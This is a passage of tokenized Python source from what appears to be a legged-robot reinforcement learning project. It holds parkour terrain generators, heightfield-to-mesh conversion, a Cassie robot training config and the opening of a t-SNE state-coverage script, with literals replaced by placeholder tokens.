) <EOL> platform_len = round ( platform_len / terrain . horizontal_scale ) <EOL> platform_height = round ( platform_height / terrain . vertical_scale ) <EOL> gap_depth = - round ( np . random . uniform ( gap_depth [ <NUM_LIT> ] , gap_depth [ <NUM_LIT> ] ) / terrain . vertical_scale ) <EOL> half_valid_width = round ( np . random . uniform ( half_valid_width [ <NUM_LIT> ] , half_valid_width [ <NUM_LIT> ] ) / terrain . horizontal_scale ) <EOL> terrain . height_field_raw [ <NUM_LIT> : platform_len , : ] = platform_height <EOL> gap_size = round ( gap_size / terrain . horizontal_scale ) <EOL> dis_x_min = round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) + gap_size <EOL> dis_x_max = round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) + gap_size <EOL> dis_x = platform_len <EOL> goals [ <NUM_LIT> ] = [ platform_len - <NUM_LIT> , mid_y ] <EOL> last_dis_x = dis_x <EOL> for i in range ( num_gaps ) : <EOL> rand_x = np . random . randint ( dis_x_min , dis_x_max ) <EOL> dis_x += rand_x <EOL> rand_y = np . random . randint ( dis_y_min , dis_y_max ) <EOL> if not flat : <EOL> terrain . height_field_raw [ dis_x - gap_size // <NUM_LIT> : dis_x + gap_size // <NUM_LIT> , : ] = gap_depth <EOL> terrain . height_field_raw [ last_dis_x : dis_x , : mid_y + rand_y - half_valid_width ] = gap_depth <EOL> terrain . height_field_raw [ last_dis_x : dis_x , mid_y + rand_y + half_valid_width : ] = gap_depth <EOL> last_dis_x = dis_x <EOL> goals [ i + <NUM_LIT> ] = [ dis_x - rand_x // <NUM_LIT> , mid_y + rand_y ] <EOL> final_dis_x = dis_x + np . random . randint ( dis_x_min , dis_x_max ) <EOL> if final_dis_x > terrain . width : <EOL> final_dis_x = terrain . width - <NUM_LIT> // terrain . horizontal_scale <EOL> goals [ - <NUM_LIT> ] = [ final_dis_x , mid_y ] <EOL> terrain . goals = goals * terrain . horizontal_scale <EOL> pad_width = int ( pad_width // terrain . horizontal_scale ) <EOL> pad_height = int ( pad_height // terrain . vertical_scale ) <EOL> terrain . height_field_raw [ : , : pad_width ] = pad_height <EOL> terrain . height_field_raw [ : , - pad_width : ] = pad_height <EOL> terrain . height_field_raw [ : pad_width , : ] = pad_height <EOL> terrain . height_field_raw [ - pad_width : , : ] = pad_height <EOL> def parkour_hurdle_terrain ( terrain , <EOL> platform_len = <NUM_LIT> , <EOL> platform_height = <NUM_LIT> , <EOL> num_stones = <NUM_LIT> , <EOL> stone_len = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = [ - <NUM_LIT> , <NUM_LIT> ] , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> hurdle_height_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> pad_width = <NUM_LIT> , <EOL> pad_height = <NUM_LIT> , <EOL> flat = False ) : <EOL> goals = np . zeros ( ( num_stones + <NUM_LIT> , <NUM_LIT> ) ) <EOL> mid_y = terrain . length // <NUM_LIT> <EOL> dis_x_min = round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_x_max = round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_min = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_max = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> half_valid_width = round ( np . random . uniform ( half_valid_width [ <NUM_LIT> ] , half_valid_width [ <NUM_LIT> ] ) / terrain . horizontal_scale ) <EOL> hurdle_height_max = round ( hurdle_height_range [ <NUM_LIT> ] / terrain . vertical_scale ) <EOL> hurdle_height_min = round ( hurdle_height_range [ <NUM_LIT> ] / terrain . vertical_scale ) <EOL> platform_len = round ( platform_len / terrain . horizontal_scale ) <EOL> platform_height = round ( platform_height / terrain . vertical_scale ) <EOL> terrain . height_field_raw [ <NUM_LIT> : platform_len , : ] = platform_height <EOL> stone_len = round ( stone_len / terrain . horizontal_scale ) <EOL> dis_x = platform_len <EOL> goals [ <NUM_LIT> ] = [ platform_len - <NUM_LIT> , mid_y ] <EOL> last_dis_x = dis_x <EOL> for i in range ( num_stones ) : <EOL> rand_x = np . random . randint ( dis_x_min , dis_x_max ) <EOL> rand_y = np . random . randint ( dis_y_min , dis_y_max ) <EOL> dis_x += rand_x <EOL> if not flat : <EOL> terrain . height_field_raw [ dis_x - stone_len // <NUM_LIT> : dis_x + stone_len // <NUM_LIT> , ] = np . random . randint ( hurdle_height_min , hurdle_height_max ) <EOL> terrain . height_field_raw [ dis_x - stone_len // <NUM_LIT> : dis_x + stone_len // <NUM_LIT> , : mid_y + rand_y - half_valid_width ] = <NUM_LIT> <EOL> terrain . height_field_raw [ dis_x - stone_len // <NUM_LIT> : dis_x + stone_len // <NUM_LIT> , mid_y + rand_y + half_valid_width : ] = <NUM_LIT> <EOL> last_dis_x = dis_x <EOL> goals [ i + <NUM_LIT> ] = [ dis_x - rand_x // <NUM_LIT> , mid_y + rand_y ] <EOL> final_dis_x = dis_x + np . random . randint ( dis_x_min , dis_x_max ) <EOL> if final_dis_x > terrain . width : <EOL> final_dis_x = terrain . width - <NUM_LIT> // terrain . horizontal_scale <EOL> goals [ - <NUM_LIT> ] = [ final_dis_x , mid_y ] <EOL> terrain . goals = goals * terrain . horizontal_scale <EOL> pad_width = int ( pad_width // terrain . horizontal_scale ) <EOL> pad_height = int ( pad_height // terrain . vertical_scale ) <EOL> terrain . height_field_raw [ : , : pad_width ] = pad_height <EOL> terrain . height_field_raw [ : , - pad_width : ] = pad_height <EOL> terrain . height_field_raw [ : pad_width , : ] = pad_height <EOL> terrain . height_field_raw [ - pad_width : , : ] = pad_height <EOL> def parkour_step_terrain ( terrain , <EOL> platform_len = <NUM_LIT> , <EOL> platform_height = <NUM_LIT> , <EOL> num_stones = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = [ - <NUM_LIT> , <NUM_LIT> ] , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> step_height = <NUM_LIT> , <EOL> pad_width = <NUM_LIT> , <EOL> pad_height = <NUM_LIT> ) : <EOL> goals = np . zeros ( ( num_stones + <NUM_LIT> , <NUM_LIT> ) ) <EOL> mid_y = terrain . length // <NUM_LIT> <EOL> dis_x_min = round ( ( x_range [ <NUM_LIT> ] + step_height ) / terrain . horizontal_scale ) <EOL> dis_x_max = round ( ( x_range [ <NUM_LIT> ] + step_height ) / terrain . horizontal_scale ) <EOL> dis_y_min = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_max = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> step_height = round ( step_height / terrain . vertical_scale ) <EOL> half_valid_width = round ( np . random . uniform ( half_valid_width [ <NUM_LIT> ] , half_valid_width [ <NUM_LIT> ] ) / terrain . horizontal_scale ) <EOL> platform_len = round ( platform_len / terrain . horizontal_scale ) <EOL> platform_height = round ( platform_height / terrain . vertical_scale ) <EOL> terrain . height_field_raw [ <NUM_LIT> : platform_len , : ] = platform_height <EOL> dis_x = platform_len <EOL> last_dis_x = dis_x <EOL> stair_height = <NUM_LIT> <EOL> goals [ <NUM_LIT> ] = [ platform_len - round ( <NUM_LIT> / terrain . horizontal_scale ) , mid_y ] <EOL> for i in range ( num_stones ) : <EOL> rand_x = np . random . randint ( dis_x_min , dis_x_max ) <EOL> rand_y = np . random . randint ( dis_y_min , dis_y_max ) <EOL> if i < num_stones // <NUM_LIT> : <EOL> stair_height += step_height <EOL> elif i > num_stones // <NUM_LIT> : <EOL> stair_height -= step_height <EOL> terrain . height_field_raw [ dis_x : dis_x + rand_x , ] = stair_height <EOL> dis_x += rand_x <EOL> terrain . height_field_raw [ last_dis_x : dis_x , : mid_y + rand_y - half_valid_width ] = <NUM_LIT> <EOL> terrain . height_field_raw [ last_dis_x : dis_x , mid_y + rand_y + half_valid_width : ] = <NUM_LIT> <EOL> last_dis_x = dis_x <EOL> goals [ i + <NUM_LIT> ] = [ dis_x - rand_x // <NUM_LIT> , mid_y + rand_y ] <EOL> final_dis_x = dis_x + np . random . randint ( dis_x_min , dis_x_max ) <EOL> if final_dis_x > terrain . width : <EOL> final_dis_x = terrain . width - <NUM_LIT> // terrain . horizontal_scale <EOL> goals [ - <NUM_LIT> ] = [ final_dis_x , mid_y ] <EOL> terrain . goals = goals * terrain . horizontal_scale <EOL> pad_width = int ( pad_width // terrain . horizontal_scale ) <EOL> pad_height = int ( pad_height // terrain . vertical_scale ) <EOL> terrain . height_field_raw [ : , : pad_width ] = pad_height <EOL> terrain . height_field_raw [ : , - pad_width : ] = pad_height <EOL> terrain . height_field_raw [ : pad_width , : ] = pad_height <EOL> terrain . height_field_raw [ - pad_width : , : ] = pad_height <EOL> def demo_terrain ( terrain ) : <EOL> goals = np . zeros ( ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> mid_y = terrain . length // <NUM_LIT> <EOL> platform_length = round ( <NUM_LIT> / terrain . horizontal_scale ) <EOL> hurdle_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> hurdle_height = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . vertical_scale ) <EOL> hurdle_width = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> goals [ <NUM_LIT> ] = [ platform_length + hurdle_depth / <NUM_LIT> , mid_y ] <EOL> terrain . height_field_raw [ platform_length : platform_length + hurdle_depth , round ( mid_y - hurdle_width / <NUM_LIT> ) : round ( mid_y + hurdle_width / <NUM_LIT> ) ] = hurdle_height <EOL> platform_length += round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> first_step_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> first_step_height = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . vertical_scale ) <EOL> first_step_width = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> goals [ <NUM_LIT> ] = [ platform_length + first_step_depth / <NUM_LIT> , mid_y ] <EOL> terrain . height_field_raw [ platform_length : platform_length + first_step_depth , round ( mid_y - first_step_width / <NUM_LIT> ) : round ( mid_y + first_step_width / <NUM_LIT> ) ] = first_step_height <EOL> platform_length += first_step_depth <EOL> second_step_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> second_step_height = first_step_height <EOL> second_step_width = first_step_width <EOL> goals [ <NUM_LIT> ] = [ platform_length + second_step_depth / <NUM_LIT> , mid_y ] <EOL> terrain . height_field_raw [ platform_length : platform_length + second_step_depth , round ( mid_y - second_step_width / <NUM_LIT> ) : round ( mid_y + second_step_width / <NUM_LIT> ) ] = second_step_height <EOL> platform_length += second_step_depth <EOL> gap_size = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> platform_length += gap_size <EOL> third_step_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> third_step_height = first_step_height <EOL> third_step_width = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> goals [ <NUM_LIT> ] = [ platform_length + third_step_depth / <NUM_LIT> , mid_y ] <EOL> terrain . height_field_raw [ platform_length : platform_length + third_step_depth , round ( mid_y - third_step_width / <NUM_LIT> ) : round ( mid_y + third_step_width / <NUM_LIT> ) ] = third_step_height <EOL> platform_length += third_step_depth <EOL> forth_step_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> forth_step_height = first_step_height <EOL> forth_step_width = third_step_width <EOL> goals [ <NUM_LIT> ] = [ platform_length + forth_step_depth / <NUM_LIT> , mid_y ] <EOL> terrain . height_field_raw [ platform_length : platform_length + forth_step_depth , round ( mid_y - forth_step_width / <NUM_LIT> ) : round ( mid_y + forth_step_width / <NUM_LIT> ) ] = forth_step_height <EOL> platform_length += forth_step_depth <EOL> gap_size = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> platform_length += gap_size <EOL> left_y = mid_y + round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> right_y = mid_y - round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> slope_height = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . vertical_scale ) <EOL> slope_depth = round ( np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> slope_width = round ( <NUM_LIT> / terrain . horizontal_scale ) <EOL> platform_height = slope_height + np . random . randint ( <NUM_LIT> , <NUM_LIT> / terrain . vertical_scale ) <EOL> goals [ <NUM_LIT> ] = [ platform_length + slope_depth / <NUM_LIT> , left_y ] <EOL> heights = np . tile ( np . linspace ( - slope_height , slope_height , slope_width ) , ( slope_depth , <NUM_LIT> ) ) * <NUM_LIT> <EOL> terrain . height_field_raw [ platform_length : platform_length + slope_depth , left_y - slope_width // <NUM_LIT> : left_y + slope_width // <NUM_LIT> ] = heights . astype ( int ) + platform_height <EOL> platform_length += slope_depth + gap_size <EOL> goals [ <NUM_LIT> ] = [ platform_length + slope_depth / <NUM_LIT> , right_y ] <EOL> heights = np . tile ( np . linspace ( - slope_height , slope_height , slope_width ) , ( slope_depth , <NUM_LIT> ) ) * - <NUM_LIT> <EOL> terrain . height_field_raw [ platform_length : platform_length + slope_depth , right_y - slope_width // <NUM_LIT> : right_y + slope_width // <NUM_LIT> ] = heights . astype ( int ) + platform_height <EOL> platform_length += slope_depth + gap_size + round ( <NUM_LIT> / terrain . horizontal_scale ) <EOL> goals [ - <NUM_LIT> ] = [ platform_length , left_y ] <EOL> terrain . goals = goals * terrain . horizontal_scale <EOL> def pit_terrain ( terrain , depth , platform_size = <NUM_LIT> ) : <EOL> depth = int ( depth / terrain . vertical_scale ) <EOL> platform_size = int ( platform_size / terrain . horizontal_scale / <NUM_LIT> ) <EOL> x1 = terrain . length // <NUM_LIT> - platform_size <EOL> x2 = terrain . length // <NUM_LIT> + platform_size <EOL> y1 = terrain . width // <NUM_LIT> - platform_size <EOL> y2 = terrain . width // <NUM_LIT> + platform_size <EOL> terrain . height_field_raw [ x1 : x2 , y1 : y2 ] = - depth <EOL> def half_sloped_terrain ( terrain , wall_width = <NUM_LIT> , start2center = <NUM_LIT> , max_height = <NUM_LIT> ) : <EOL> wall_width_int = max ( int ( wall_width / terrain . horizontal_scale ) , <NUM_LIT> ) <EOL> max_height_int = int ( max_height / terrain . vertical_scale ) <EOL> slope_start = int ( start2center / terrain . horizontal_scale + terrain . length // <NUM_LIT> ) <EOL> terrain_length = terrain . length <EOL> height2width_ratio = max_height_int / wall_width_int <EOL> xs = np . arange ( slope_start , terrain_length ) <EOL> heights = ( height2width_ratio * ( xs - slope_start ) ) . clip ( max = max_height_int ) . astype ( np . int16 ) <EOL> terrain . height_field_raw [ slope_start : terrain_length , : ] = heights [ : , None ] <EOL> terrain . slope_vector = np . array ( [ wall_width_int * terrain . horizontal_scale , <NUM_LIT> , max_height ] ) . astype ( np . float32 ) <EOL> terrain . slope_vector /= np . linalg . norm ( terrain . slope_vector ) <EOL> def half_platform_terrain ( terrain , start2center = <NUM_LIT> , max_height = <NUM_LIT> ) : <EOL> max_height_int = int ( max_height / terrain . vertical_scale ) <EOL> slope_start = int ( start2center / terrain . horizontal_scale + terrain . length // <NUM_LIT> ) <EOL> terrain_length = terrain . length <EOL> terrain . height_field_raw [ : , : ] = max_height_int <EOL> terrain . height_field_raw [ - slope_start : slope_start , - slope_start : slope_start ] = <NUM_LIT> <EOL> def stepping_stones_terrain ( terrain , stone_size , stone_distance , max_height , platform_size = <NUM_LIT> , depth = - <NUM_LIT> ) : <EOL> def get_rand_dis_int ( scale ) : <EOL> return np . random . randint ( int ( - scale / terrain . horizontal_scale + <NUM_LIT> ) , int ( scale / terrain . horizontal_scale ) ) <EOL> stone_size = int ( stone_size / terrain . horizontal_scale ) <EOL> stone_distance = int ( stone_distance / terrain . horizontal_scale ) <EOL> max_height = int ( max_height / terrain . vertical_scale ) <EOL> platform_size = int ( platform_size / terrain . horizontal_scale ) <EOL> height_range = np . arange ( - max_height - <NUM_LIT> , max_height , step = <NUM_LIT> ) <EOL> start_x = <NUM_LIT> <EOL> start_y = <NUM_LIT> <EOL> terrain . height_field_raw [ : , : ] = int ( depth / terrain . vertical_scale ) <EOL> if terrain . length >= terrain . width : <EOL> while start_y < terrain . length : <EOL> stop_y = min ( terrain . length , start_y + stone_size ) <EOL> start_x = np . random . randint ( <NUM_LIT> , stone_size ) <EOL> stop_x = max ( <NUM_LIT> , start_x - stone_distance - get_rand_dis_int ( <NUM_LIT> ) ) <EOL> terrain . height_field_raw [ <NUM_LIT> : stop_x , start_y : stop_y ] = np . random . choice ( height_range ) <EOL> while start_x < terrain . width : <EOL> stop_x = min ( terrain . width , start_x + stone_size ) <EOL> terrain . height_field_raw [ start_x : stop_x , start_y : stop_y ] = np . random . choice ( height_range ) <EOL> start_x += stone_size + stone_distance + get_rand_dis_int ( <NUM_LIT> ) <EOL> start_y += stone_size + stone_distance + get_rand_dis_int ( <NUM_LIT> ) <EOL> elif terrain . width > terrain . length : <EOL> while start_x < terrain . width : <EOL> stop_x = min ( terrain . width , start_x + stone_size ) <EOL> start_y = np . random . randint ( <NUM_LIT> , stone_size ) <EOL> stop_y = max ( <NUM_LIT> , start_y - stone_distance ) <EOL> terrain . height_field_raw [ start_x : stop_x , <NUM_LIT> : stop_y ] = np . random . choice ( height_range ) <EOL> while start_y < terrain . length : <EOL> stop_y = min ( terrain . length , start_y + stone_size ) <EOL> terrain . height_field_raw [ start_x : stop_x , start_y : stop_y ] = np . random . choice ( height_range ) <EOL> start_y += stone_size + stone_distance <EOL> start_x += stone_size + stone_distance <EOL> x1 = ( terrain . width - platform_size ) // <NUM_LIT> <EOL> x2 = ( terrain . width + platform_size ) // <NUM_LIT> <EOL> y1 = ( terrain . length - platform_size ) // <NUM_LIT> <EOL> y2 = ( terrain . length + platform_size ) // <NUM_LIT> <EOL> terrain . height_field_raw [ x1 : x2 , y1 : y2 ] = <NUM_LIT> <EOL> return terrain <EOL> def convert_heightfield_to_trimesh_delatin ( height_field_raw , horizontal_scale , vertical_scale , max_error = <NUM_LIT> ) : <EOL> mesh = Delatin ( np . flip ( height_field_raw , axis = <NUM_LIT> ) . T , z_scale = vertical_scale , max_error = max_error ) <EOL> vertices = np . zeros_like ( mesh . vertices ) <EOL> vertices [ : , : <NUM_LIT> ] = mesh . vertices [ : , : <NUM_LIT> ] * horizontal_scale <EOL> vertices [ : , <NUM_LIT> ] = mesh . vertices [ : , <NUM_LIT> ] <EOL> return vertices , mesh . triangles <EOL> def convert_heightfield_to_trimesh ( height_field_raw , horizontal_scale , vertical_scale , slope_threshold = None ) : <EOL> hf = height_field_raw <EOL> num_rows = hf . shape [ <NUM_LIT> ] <EOL> num_cols = hf . shape [ <NUM_LIT> ] <EOL> y = np . linspace ( <NUM_LIT> , ( num_cols - <NUM_LIT> ) * horizontal_scale , num_cols ) <EOL> x = np . linspace ( <NUM_LIT> , ( num_rows - <NUM_LIT> ) * horizontal_scale , num_rows ) <EOL> yy , xx = np . meshgrid ( y , x ) <EOL> if slope_threshold is not None : <EOL> slope_threshold *= horizontal_scale / vertical_scale <EOL> move_x = np . zeros ( ( num_rows , num_cols ) ) <EOL> move_y = np . zeros ( ( num_rows , num_cols ) ) <EOL> move_corners = np . zeros ( ( num_rows , num_cols ) ) <EOL> move_x [ : num_rows - <NUM_LIT> , : ] += ( hf [ <NUM_LIT> : num_rows , : ] - hf [ : num_rows - <NUM_LIT> , : ] > slope_threshold ) <EOL> move_x [ <NUM_LIT> : num_rows , : ] -= ( hf [ : num_rows - <NUM_LIT> , : ] - hf [ <NUM_LIT> : num_rows , : ] > slope_threshold ) <EOL> move_y [ : , : num_cols - <NUM_LIT> ] += ( hf [ : , <NUM_LIT> : num_cols ] - hf [ : , : num_cols - <NUM_LIT> ] > slope_threshold ) <EOL> move_y [ : , <NUM_LIT> : num_cols ] -= ( hf [ : , : num_cols - <NUM_LIT> ] - hf [ : , <NUM_LIT> : num_cols ] > slope_threshold ) <EOL> move_corners [ : num_rows - <NUM_LIT> , : num_cols - <NUM_LIT> ] += ( hf [ <NUM_LIT> : num_rows , <NUM_LIT> : num_cols ] - hf [ : num_rows - <NUM_LIT> , : num_cols - <NUM_LIT> ] > slope_threshold ) <EOL> move_corners [ <NUM_LIT> : num_rows , <NUM_LIT> : num_cols ] -= ( hf [ : num_rows - <NUM_LIT> , : num_cols - <NUM_LIT> ] - hf [ <NUM_LIT> : num_rows , <NUM_LIT> : num_cols ] > slope_threshold ) <EOL> xx += ( move_x + move_corners * ( move_x == <NUM_LIT> ) ) * horizontal_scale <EOL> yy += ( move_y + move_corners * ( move_y == <NUM_LIT> ) ) * horizontal_scale <EOL> vertices = np . zeros ( ( num_rows * num_cols , <NUM_LIT> ) , dtype = np . float32 ) <EOL> vertices [ : , <NUM_LIT> ] = xx . flatten ( ) <EOL> vertices [ : , <NUM_LIT> ] = yy . flatten ( ) <EOL> vertices [ : , <NUM_LIT> ] = hf . flatten ( ) * vertical_scale <EOL> triangles = - np . ones ( ( <NUM_LIT> * ( num_rows - <NUM_LIT> ) * ( num_cols - <NUM_LIT> ) , <NUM_LIT> ) , dtype = np . uint32 ) <EOL> for i in range ( num_rows - <NUM_LIT> ) : <EOL> ind0 = np . arange ( <NUM_LIT> , num_cols - <NUM_LIT> ) + i * num_cols <EOL> ind1 = ind0 + <NUM_LIT> <EOL> ind2 = ind0 + num_cols <EOL> ind3 = ind2 + <NUM_LIT> <EOL> start = <NUM_LIT> * i * ( num_cols - <NUM_LIT> ) <EOL> stop = start + <NUM_LIT> * ( num_cols - <NUM_LIT> ) <EOL> triangles [ start : stop : <NUM_LIT> , <NUM_LIT> ] = ind0 <EOL> triangles [ start : stop : <NUM_LIT> , <NUM_LIT> ] = ind3 <EOL> triangles [ start : stop : <NUM_LIT> , <NUM_LIT> ] = ind1 <EOL> triangles [ start + <NUM_LIT> : stop : <NUM_LIT> , <NUM_LIT> ] = ind0 <EOL> triangles [ start + <NUM_LIT> : stop : <NUM_LIT> , <NUM_LIT> ] = ind2 <EOL> triangles [ start + <NUM_LIT> : stop : <NUM_LIT> , <NUM_LIT> ] = ind3 <EOL> return vertices , triangles , move_x != <NUM_LIT> <EOL> </s>
<s> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class CassieRoughCfg ( LeggedRobotCfg ) : <EOL> class env ( LeggedRobotCfg . env ) : <EOL> num_envs = <NUM_LIT> <EOL> num_observations = <NUM_LIT> <EOL> num_actions = <NUM_LIT> <EOL> class terrain ( LeggedRobotCfg . terrain ) : <EOL> measured_points_x = [ - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> measured_points_y = [ - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> class init_state ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> <EOL> } <EOL> class control ( LeggedRobotCfg . control ) : <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset ( LeggedRobotCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = '<STR_LIT>' <EOL> terminate_after_contacts_on = [ '<STR_LIT>' ] <EOL> flip_visual_attachments = False <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( LeggedRobotCfg . rewards ) : <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> soft_dof_vel_limit = <NUM_LIT> <EOL> soft_torque_limit = <NUM_LIT> <EOL> max_contact_force = <NUM_LIT> <EOL> only_positive_rewards = False <EOL> class scales ( LeggedRobotCfg . rewards . scales ) : <EOL> termination = - <NUM_LIT> <EOL> tracking_ang_vel = <NUM_LIT> <EOL> torques = - <NUM_LIT> <EOL> dof_acc = - <NUM_LIT> <EOL> lin_vel_z = - <NUM_LIT> <EOL> feet_air_time = <NUM_LIT> <EOL> dof_pos_limits = - <NUM_LIT> <EOL> no_fly = <NUM_LIT> <EOL> dof_vel = - <NUM_LIT> <EOL> ang_vel_xy = - <NUM_LIT> <EOL> feet_contact_forces = - <NUM_LIT> <EOL> class CassieRoughCfgPPO ( LeggedRobotCfgPPO ) : <EOL> class runner ( LeggedRobotCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> class algorithm ( LeggedRobotCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> </s>
<s> import numpy as np <EOL> import os <EOL> from sklearn . manifold import TSNE <EOL> import matplotlib . pyplot as plt <EOL> import argparse <EOL> width = <NUM_LIT> <EOL> walk_xlim = ( <NUM_LIT> , <NUM_LIT> ) <EOL> walk_ylim = ( - <NUM_LIT> , <NUM_LIT> ) <EOL> jump_xlim = ( - <NUM_LIT> , <NUM_LIT> ) <EOL> jump_ylim = ( <NUM_LIT> , <NUM_LIT> ) <EOL> def state_coverage ( points , dim1_range = ( - <NUM_LIT> , <NUM_LIT> ) , dim2_range = ( <NUM_LIT> , <NUM_LIT> ) ) : <EOL> resolution = <NUM_LIT> <EOL> num_bins = int ( <NUM_LIT> / resolution ) <EOL> print ( points . shape , points [ : , <NUM_LIT> ] . min ( ) , points [ : , <NUM_LIT> ] . max ( ) , points [ : , <NUM_LIT> ] . min ( ) , points [ : , <NUM_LIT> ] . max ( ) ) <EOL> points = np . clip ( ( points - np . array ( [ dim1_range [ <NUM_LIT> ] , dim2_range [ <NUM_LIT> ] ] ) ) / np . array ( [ dim1_range [ <NUM_LIT> ] - dim1_range [ <NUM_LIT> ] , dim2_range [ <NUM_LIT> ] - dim2_range [ <NUM_LIT> ] ] ) , <NUM_LIT> , <NUM_LIT> ) <EOL> bins = np . zeros ( ( num_bins , num_bins ) ) <EOL> for point in points : <EOL> bin1 = min ( int ( point [ <NUM_LIT> ] * num_bins ) , num_bins - <NUM_LIT> ) <EOL> bin2 = min ( int ( point [ <NUM_LIT> ] * num_bins ) , num_bins - <NUM_LIT> ) <EOL> bins [ bin1 , bin2 ] += <NUM_LIT> <EOL> score = np . sum ( bins > <NUM_LIT> ) / ( num_bins ** <NUM_LIT> ) <EOL> return bins , score <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str , default = "<STR_LIT>" ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = False ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = False ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = False ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = True ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = True ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = True ) <EOL> args = parser . parse_args ( ) <EOL> prefix = f"<STR_LIT>" + ( "<STR_LIT>" if args . jump else "<STR_LIT>" ) <EOL> print ( prefix ) <EOL> dir_name = f"<STR_LIT>" <EOL> os . makedirs ( dir_name , exist_ok = True ) <EOL> exptid = args . exptid <EOL> data_raw = np . load ( f'<STR_LIT>' , allow_pickle = True ) <EOL> features = data_raw [ : , : - <NUM_LIT> ] <EOL> labels = data_raw [ : , - <NUM_LIT> ] <EOL> print ( features . shape , labels . shape ) <EOL> if args . tsne : <EOL> tsne = TSNE ( n_components = <NUM_LIT> , perplexity = <NUM_LIT> , random_state = <NUM_LIT> , verbose = <NUM_LIT> ) <EOL> tsne_features = tsne . fit_transform ( features ) <EOL> fig , ax = plt . subplots ( ) <EOL> 